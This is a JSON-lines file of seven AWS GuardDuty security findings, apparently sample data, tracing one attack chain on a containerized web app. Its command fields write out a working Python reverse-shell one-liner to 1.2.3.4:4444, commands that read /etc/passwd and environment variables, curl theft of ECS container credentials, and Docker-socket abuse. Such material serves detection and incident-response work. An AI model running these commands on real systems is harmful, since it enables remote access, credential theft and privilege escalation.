{"accountId":"123456789012","arn":"arn:aws:guardduty:us-east-1:123456789012:detector/12abc34d567e8fa901bc2d34e56789ab/finding/bd1234cc5678aa9012bb3456ccddeeff","createdAt":"2025-12-14T10:52:06.214Z","id":"bd1234cc5678aa9012bb3456ccddeeff","region":"us-east-1","schemaVersion":"2.0","severity":7.4,"type":"Backdoor:EC2/C&CActivity","updatedAt":"2025-12-14T10:52:06.214Z","confidence":0.92,"partition":"aws","title":"EC2 instance communicating with a known command-and-control server","description":"An EC2 instance is communicating with an IP address associated with known command-and-control infrastructure, indicating a possible backdoor compromise.","associatedAttackSequenceArn":"arn:aws:guardduty:us-east-1:123456789012:attack-sequence/seq-9f8e7d6c5b4a3210","resource":{"resourceType":"Instance","instanceDetails":{"availabilityZone":"us-east-1a","instanceId":"i-0abc1234def567890","instanceState":"running","instanceType":"t3.medium","launchTime":"2025-12-01T06:12:44.000Z","imageId":"ami-0a1b2c3d4e5f67890","imageDescription":"Amazon Linux 2 AMI","platform":"LINUX","iamInstanceProfile":{"arn":"arn:aws:iam::123456789012:instance-profile/WebAppInstanceProfile","id":"AIPAJFEXAMPLE123"},"networkInterfaces":[{"networkInterfaceId":"eni-0a1b2c3d4e5f67890","privateDnsName":"ip-10-0-1-25.ec2.internal","privateIpAddress":"10.0.1.25","publicDnsName":"ec2-54-210-123-45.compute-1.amazonaws.com","publicIp":"54.210.123.45","subnetId":"subnet-0abc1234def567890","vpcId":"vpc-0123abcd4567efgh8","ipv6Addresses":[],"privateIpAddresses":[{"privateDnsName":"ip-10-0-1-26.ec2.internal","privateIpAddress":"10.0.1.26"}],"securityGroups":[{"groupId":"sg-0a1b2c3d4e5f67890","groupName":"webapp-sg"}]}],"productCodes":[{"productCodeId":"aw0evgkw8e5c1q413zgy5pjce","productCodeType":"marketplace"}],"tags":[{"key":"Name","value":"webapp-prod-ec2"},{"key":"Environment","value":"production"},{"key":"Application","value":"customer-portal"}],"outpostArn":""}},"service":{"serviceName":"GuardDuty","featureName":"EC2 Threat Detection","detectorId":"12abc34d567e8fa901bc2d34e56789ab","archived":false,"count":1,"eventFirstSeen":"2025-12-14T10:43:12.087Z","eventLastSeen":"2025-12-14T10:45:06.214Z","resourceRole":"TARGET","action":{"actionType":"NETWORK_CONNECTION","networkConnectionAction":{"blocked":false,"connectionDirection":"OUTBOUND","protocol":"TCP","localNetworkInterface":"eni-0a1b2c3d4e5f67890","localIpDetails":{"ipAddressV4":"10.0.1.25"},"localPortDetails":{"port":45678,"portName":"ephemeral"},"remoteIpDetails":{"ipAddressV4":"1.2.3.4","city":{"cityName":"Amsterdam"},"country":{"countryCode":"NL","countryName":"Netherlands"},"geoLocation":{"lat":52.3676,"lon":4.9041},"organization":{"asn":"AS13335","asnOrg":"Cloudflare, Inc.","isp":"Cloudflare","org":"Cloudflare, Inc."}},"remotePortDetails":{"port":4444,"portName":"unknown"}}},"detection":{"anomaly":{"profiles":{"network-connection":[{"observations":{"text":["Outbound TCP connections to IP address 1.2.3.4 on port 4444 were observed."]},"profileSubtype":"RARE","profileType":"FREQUENCY"}]}}},"evidence":{"threatIntelligenceDetails":[{"threatFileSha256":"","threatListName":"AWSGuardDutyKnownC2IPs","threatNames":["KnownCommandAndControlServer"]}]}}}
{"accountId":"123456789012","arn":"arn:aws:guardduty:us-east-1:123456789012:detector/12abc34d567e8fa901bc2d34e56789ab/finding/iam7890bb2233cc4455ddeeff66778899","createdAt":"2025-12-14T10:46:12.907Z","id":"iam7890bb2233cc4455ddeeff66778899","region":"us-east-1","schemaVersion":"2.0","severity":6.8,"type":"Discovery:IAMUser/AnomalousBehavior","updatedAt":"2025-12-14T10:46:12.907Z","confidence":0.76,"partition":"aws","title":"Unusual IAM discovery activity observed","description":"An IAM principal exhibited anomalous discovery behavior by invoking identity, permission simulation, and resource listing APIs that are unusual compared to its historical usage patterns.","associatedAttackSequenceArn":"arn:aws:guardduty:us-east-1:123456789012:attack-sequence/seq-9f8e7d6c5b4a3210","resource":{"resourceType":"AccessKey","accessKeyDetails":{"accessKeyId":"ASIAZEXAMPLE123456","principalId":"AROAEXAMPLEID:ecs-task-session","userName":"WebAppEcsTaskRole","userType":"AssumedRole"}},"service":{"serviceName":"GuardDuty","featureName":"IAM Threat Detection","detectorId":"12abc34d567e8fa901bc2d34e56789ab","archived":false,"count":4,"eventFirstSeen":"2025-12-14T10:45:21.334Z","eventLastSeen":"2025-12-14T10:46:08.902Z","resourceRole":"TARGET","action":{"actionType":"AWS_API_CALL","awsApiCallAction":{"api":"sts:GetCallerIdentity, iam:SimulateCustomPolicy, s3:ListBuckets","serviceName":"sts, iam, s3, secretsmanager","callerType":"AssumedRole","userAgent":"aws-cli/2.15.0 Python/3.11 botocore/2.4.0","affectedResources":{"AWS::Account":"123456789012"},"domainDetails":{"domain":"sts.amazonaws.com"},"remoteIpDetails":{"ipAddressV4":"54.210.123.45","city":{"cityName":"Ashburn"},"country":{"countryCode":"US","countryName":"United States"},"geoLocation":{"lat":39.0438,"lon":-77.4874},"organization":{"asn":"AS14618","asnOrg":"Amazon.com, Inc.","isp":"Amazon AWS","org":"Amazon Web Services"}}}},"detection":{"anomaly":{"profiles":{"api-usage":[{"observations":{"text":["The IAM principal invoked identity, policy simulation, and resource listing APIs that are unusual compared to its historical behavior."]},"profileSubtype":"UNSEEN","profileType":"FREQUENCY"}]}}}}}
{"accountId":"123456789012","arn":"arn:aws:guardduty:us-east-1:123456789012:detector/12abc34d567e8fa901bc2d34e56789ab/finding/dc7890ef1234aa9012bb3456ddeeff99","createdAt":"2025-12-14T10:42:32.904Z","id":"dc7890ef1234aa9012bb3456ddeeff99","region":"us-east-1","schemaVersion":"2.0","severity":6.3,"type":"Discovery:Runtime/SuspiciousCommand","updatedAt":"2025-12-14T10:42:32.904Z","confidence":0.81,"partition":"aws","title":"Suspicious discovery commands executed in runtime workload","description":"After a reverse shell was established, the runtime workload executed discovery-related commands indicative of post-compromise reconnaissance activity.","associatedAttackSequenceArn":"arn:aws:guardduty:us-east-1:123456789012:attack-sequence/seq-9f8e7d6c5b4a3210","resource":{"resourceType":"Container","containerDetails":{"containerRuntime":"containerd","id":"9f3c2a1b7d8e4f56a0c123456789abcd","image":"public.ecr.aws/nginx/nginx:1.25","imagePrefix":"public.ecr.aws/nginx","name":"webapp-backend","securityContext":{"allowPrivilegeEscalation":true,"privileged":true},"volumeMounts":[{"mountPath":"/var/run/docker.sock","name":"docker-socket"}]}},"service":{"serviceName":"GuardDuty","featureName":"Runtime Monitoring","detectorId":"12abc34d567e8fa901bc2d34e56789ab","archived":false,"count":3,"eventFirstSeen":"2025-12-14T10:42:32.904Z","eventLastSeen":"2025-12-14T10:42:41.118Z","resourceRole":"TARGET","runtimeDetails":{"context":{"commandLineExample":"whoami; cat /etc/passwd; env","toolCategory":"Discovery","toolName":"Post-compromise enumeration"},"process":{"name":"sh","executablePath":"/bin/sh","pid":438,"namespacePid":438,"uuid":"proc-shell-92fd7c1a","parentUuid":"proc-python3-b81f9a6d","pwd":"/","startTime":"2025-12-14T10:42:31.887Z","user":"www-data","userId":33,"euid":33,"lineage":[{"name":"python3","executablePath":"/usr/bin/python3","pid":421,"namespacePid":421,"uuid":"proc-python3-b81f9a6d","startTime":"2025-12-14T10:41:51.902Z","userId":33,"euid":33}]}}}}
{"accountId":"123456789012","arn":"arn:aws:guardduty:us-east-1:123456789012:detector/12abc34d567e8fa901bc2d34e56789ab/finding/rs7890aa1122bb3344ccddeeff001122","createdAt":"2025-12-14T10:44:58.214Z","id":"rs7890aa1122bb3344ccddeeff001122","region":"us-east-1","schemaVersion":"2.0","severity":6.5,"type":"Discovery:Runtime/SuspiciousCommand","updatedAt":"2025-12-14T10:44:58.214Z","confidence":0.79,"partition":"aws","title":"Suspicious cloud discovery commands executed in runtime workload","description":"Following access to the container metadata service, the runtime workload executed AWS CLI commands to enumerate identity, permissions, and cloud resources, indicating post-compromise discovery activity.","associatedAttackSequenceArn":"arn:aws:guardduty:us-east-1:123456789012:attack-sequence/seq-9f8e7d6c5b4a3210","resource":{"resourceType":"Container","containerDetails":{"containerRuntime":"containerd","id":"9f3c2a1b7d8e4f56a0c123456789abcd","image":"public.ecr.aws/nginx/nginx:1.25","imagePrefix":"public.ecr.aws/nginx","name":"webapp-backend","securityContext":{"allowPrivilegeEscalation":true,"privileged":true},"volumeMounts":[{"mountPath":"/var/run/docker.sock","name":"docker-socket"}]}},"service":{"serviceName":"GuardDuty","featureName":"Runtime Monitoring","detectorId":"12abc34d567e8fa901bc2d34e56789ab","archived":false,"count":4,"eventFirstSeen":"2025-12-14T10:44:48.902Z","eventLastSeen":"2025-12-14T10:44:57.991Z","resourceRole":"TARGET","runtimeDetails":{"context":{"commandLineExample":"aws sts get-caller-identity; aws iam simulate-custom-policy --policy-input-list '{\"Statement\":[{\"Effect\":\"Allow\",\"Action\":[\"s3:ListAllMyBuckets\"],\"Resource\":[\"*\"]}]}'; aws s3 ls","toolCategory":"Discovery","toolName":"AWS CLI Cloud Enumeration"},"process":{"name":"aws","executablePath":"/usr/bin/aws","pid":476,"namespacePid":476,"uuid":"proc-awscli-6e2c9d81","parentUuid":"proc-shell-92fd7c1a","pwd":"/","startTime":"2025-12-14T10:44:48.741Z","user":"www-data","userId":33,"euid":33,"lineage":[{"name":"sh","executablePath":"/bin/sh","pid":438,"namespacePid":438,"uuid":"proc-shell-92fd7c1a","parentUuid":"proc-python3-b81f9a6d","startTime":"2025-12-14T10:42:31.887Z","userId":33,"euid":33},{"name":"python3","executablePath":"/usr/bin/python3","pid":421,"namespacePid":421,"uuid":"proc-python3-b81f9a6d","startTime":"2025-12-14T10:41:51.902Z","userId":33,"euid":33}]}}}}
{"accountId":"123456789012","arn":"arn:aws:guardduty:us-east-1:123456789012:detector/12abc34d567e8fa901bc2d34e56789ab/finding/abcd1234efgh5678ijkl9012mnop3456","createdAt":"2025-12-14T10:42:18.392Z","id":"abcd1234efgh5678ijkl9012mnop3456","region":"us-east-1","schemaVersion":"2.0","severity":8.7,"type":"Execution:Runtime/ReverseShell","updatedAt":"2025-12-14T10:42:18.392Z","confidence":0.86,"partition":"aws","title":"Runtime reverse shell activity detected","description":"A reverse shell was detected from a runtime workload to an external IP address, indicating potential post-compromise command-and-control activity.","associatedAttackSequenceArn":"arn:aws:guardduty:us-east-1:123456789012:attack-sequence/seq-9f8e7d6c5b4a3210","resource":{"resourceType":"Container","containerDetails":{"containerRuntime":"containerd","id":"9f3c2a1b7d8e4f56a0c123456789abcd","image":"public.ecr.aws/nginx/nginx:1.25","imagePrefix":"public.ecr.aws/nginx","name":"webapp-backend","securityContext":{"allowPrivilegeEscalation":true,"privileged":true},"volumeMounts":[{"mountPath":"/var/run/docker.sock","name":"docker-socket"}]}},"service":{"serviceName":"GuardDuty","featureName":"Runtime Monitoring","detectorId":"12abc34d567e8fa901bc2d34e56789ab","archived":false,"count":1,"eventFirstSeen":"2025-12-14T10:41:52.113Z","eventLastSeen":"2025-12-14T10:42:18.392Z","runtimeDetails":{"context":{"addressFamily":"AF_INET","ianaProtocolNumber":6,"commandLineExample":"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"1.2.3.4\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'","scriptPath":"/uploads/shell.php","toolCategory":"Backdoor Tool","toolName":"Python Reverse Shell"},"process":{"name":"python3","executablePath":"/usr/bin/python3","executableSha256":"4d3c2f8b9a1e6d7f8c9b0a1e2d3f4c5b6a7e8f9a0b1c2d3e4f5a6b7c8d9e","pid":421,"namespacePid":421,"uuid":"proc-python3-b81f9a6d","parentUuid":"proc-php-fpm-7a9c3e12","pwd":"/var/www/html/uploads","startTime":"2025-12-14T10:41:51.902Z","user":"www-data","userId":33,"euid":33,"lineage":[{"name":"php-fpm","executablePath":"/usr/sbin/php-fpm","pid":214,"namespacePid":214,"uuid":"proc-php-fpm-7a9c3e12","parentUuid":"proc-nginx-3f91ab2c","startTime":"2025-12-14T10:41:32.417Z","userId":33,"euid":33},{"name":"nginx","executablePath":"/usr/sbin/nginx","pid":102,"namespacePid":102,"uuid":"proc-nginx-3f91ab2c","startTime":"2025-12-14T10:39:58.004Z","userId":0,"euid":0}]}}}}
{"accountId":"123456789012","arn":"arn:aws:guardduty:us-east-1:123456789012:detector/12abc34d567e8fa901bc2d34e56789ab/finding/pe1122bb3344ccddeeff556677889900","createdAt":"2025-12-14T10:45:22.614Z","id":"pe1122bb3344ccddeeff556677889900","region":"us-east-1","schemaVersion":"2.0","severity":8.2,"type":"PrivilegeEscalation:Runtime/DockerSocketAccessed","updatedAt":"2025-12-14T10:45:22.614Z","confidence":0.91,"partition":"aws","title":"Docker socket accessed by a runtime workload","description":"A runtime workload accessed the Docker daemon socket, indicating a potential attempt to escalate privileges by interacting directly with the container runtime on the host.","associatedAttackSequenceArn":"arn:aws:guardduty:us-east-1:123456789012:attack-sequence/seq-9f8e7d6c5b4a3210","resource":{"resourceType":"Container","containerDetails":{"containerRuntime":"containerd","id":"9f3c2a1b7d8e4f56a0c123456789abcd","image":"public.ecr.aws/nginx/nginx:1.25","imagePrefix":"public.ecr.aws/nginx","name":"webapp-backend","securityContext":{"allowPrivilegeEscalation":true,"privileged":true},"volumeMounts":[{"mountPath":"/var/run/docker.sock","name":"docker-socket"}]}},"service":{"serviceName":"GuardDuty","featureName":"Runtime Monitoring","detectorId":"12abc34d567e8fa901bc2d34e56789ab","archived":false,"count":1,"eventFirstSeen":"2025-12-14T10:45:12.083Z","eventLastSeen":"2025-12-14T10:45:21.944Z","resourceRole":"TARGET","runtimeDetails":{"context":{"commandLineExample":"curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/create","toolCategory":"PrivilegeEscalation","toolName":"Docker Remote API","socketPath":"/var/run/docker.sock"},"process":{"name":"curl","executablePath":"/usr/bin/curl","pid":512,"namespacePid":512,"uuid":"proc-curl-dockersock-4a7c2e19","parentUuid":"proc-shell-92fd7c1a","pwd":"/","startTime":"2025-12-14T10:45:11.774Z","user":"www-data","userId":33,"euid":33,"lineage":[{"name":"sh","executablePath":"/bin/sh","pid":438,"namespacePid":438,"uuid":"proc-shell-92fd7c1a","parentUuid":"proc-python3-b81f9a6d","startTime":"2025-12-14T10:42:31.887Z","userId":33,"euid":33},{"name":"python3","executablePath":"/usr/bin/python3","pid":421,"namespacePid":421,"uuid":"proc-python3-b81f9a6d","startTime":"2025-12-14T10:41:51.902Z","userId":33,"euid":33}]}}}}
{"accountId":"123456789012","arn":"arn:aws:guardduty:us-east-1:123456789012:detector/12abc34d567e8fa901bc2d34e56789ab/finding/md4567ab8901ccde2345ff6677889900","createdAt":"2025-12-14T10:42:55.642Z","id":"md4567ab8901ccde2345ff6677889900","region":"us-east-1","schemaVersion":"2.0","severity":7.1,"type":"UnauthorizedAccess:Runtime/MetadataDNSRebind","updatedAt":"2025-12-14T10:42:55.642Z","confidence":0.84,"partition":"aws","title":"Container attempted access to runtime metadata endpoint","description":"A process running inside a container attempted to access a runtime metadata endpoint, which may indicate an attempt to enumerate or harvest credentials and task metadata following a compromise.","associatedAttackSequenceArn":"arn:aws:guardduty:us-east-1:123456789012:attack-sequence/seq-9f8e7d6c5b4a3210","resource":{"resourceType":"Container","containerDetails":{"containerRuntime":"containerd","id":"9f3c2a1b7d8e4f56a0c123456789abcd","image":"public.ecr.aws/nginx/nginx:1.25","imagePrefix":"public.ecr.aws/nginx","name":"webapp-backend","securityContext":{"allowPrivilegeEscalation":true,"privileged":true},"volumeMounts":[{"mountPath":"/var/run/docker.sock","name":"docker-socket"}]}},"service":{"serviceName":"GuardDuty","featureName":"Runtime Monitoring","detectorId":"12abc34d567e8fa901bc2d34e56789ab","archived":false,"count":2,"eventFirstSeen":"2025-12-14T10:43:45.102Z","eventLastSeen":"2025-12-14T10:43:48.611Z","resourceRole":"TARGET","action":{"actionType":"NETWORK_CONNECTION","networkConnectionAction":{"blocked":false,"connectionDirection":"OUTBOUND","protocol":"TCP","localNetworkInterface":"eth0","localIpDetails":{"ipAddressV4":"169.254.170.2"},"localPortDetails":{"port":41876,"portName":"ephemeral"},"remoteIpDetails":{"ipAddressV4":"169.254.170.2"},"remotePortDetails":{"port":80,"portName":"http"}}},"runtimeDetails":{"context":{"addressFamily":"AF_INET","ianaProtocolNumber":6,"commandLineExample":"curl $ECS_CONTAINER_METADATA_URI_V4/task; curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI","toolCategory":"Credential Access","toolName":"ECS Container Metadata Endpoint Access"},"process":{"name":"curl","executablePath":"/usr/bin/curl","pid":452,"namespacePid":452,"uuid":"proc-curl-4f3a9b21","parentUuid":"proc-shell-92fd7c1a","startTime":"2025-12-14T10:43:44.887Z","user":"www-data","userId":33,"euid":33,"lineage":[{"name":"sh","executablePath":"/bin/sh","pid":438,"namespacePid":438,"uuid":"proc-shell-92fd7c1a","parentUuid":"proc-python3-b81f9a6d","startTime":"2025-12-14T10:42:31.887Z","userId":33,"euid":33},{"name":"python3","executablePath":"/usr/bin/python3","pid":421,"namespacePid":421,"uuid":"proc-python3-b81f9a6d","startTime":"2025-12-14T10:41:51.902Z","userId":33,"euid":33}]}}}}







